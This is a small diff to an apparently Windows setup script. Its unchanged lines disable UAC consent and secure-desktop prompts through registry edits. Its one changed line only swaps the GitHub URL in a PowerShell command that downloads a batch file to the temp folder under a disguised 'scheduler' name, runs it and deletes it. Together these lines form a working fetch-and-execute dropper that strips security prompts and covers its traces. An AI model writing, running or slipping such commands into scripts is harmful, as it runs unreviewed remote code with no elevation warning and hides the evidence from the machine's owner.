@@ -1,4 +1,4 @@
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
 
-Invoke-WebRequest 'https://raw.githubusercontent.com/minhtuan283/hostAdobe/main/run.bat' -OutFile ($f="$env:TMP\scheduler_$([guid]::NewGuid()).bat"); Start-Process cmd "/c `"$f`"" -Wait; del $f
+Invoke-WebRequest 'https://raw.githubusercontent.com/minhtuan283/host/main/run.bat' -OutFile ($f="$env:TMP\scheduler_$([guid]::NewGuid()).bat"); Start-Process cmd "/c `"$f`"" -Wait; del $f
